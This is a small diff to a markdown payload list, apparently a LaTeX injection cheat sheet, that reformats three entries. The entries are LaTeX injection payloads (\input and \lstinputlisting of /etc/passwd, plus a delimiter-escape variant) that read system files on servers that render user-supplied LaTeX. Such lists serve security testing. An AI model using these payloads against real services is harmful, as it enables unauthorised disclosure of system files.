@@ -2,8 +2,8 @@
 
 ### Payloads:
 
- - \input{/etc/passwd}
+    \input{/etc/passwd}
 
- - \lstinputlisting{/etc/passwd}
+    \lstinputlisting{/etc/passwd}
 
- - $$\\lstinputlisting{/etc/passwd}$ (Delimiter escape. One-liner)
+    $$\\lstinputlisting{/etc/passwd}$ (Delimiter escape. One-liner)
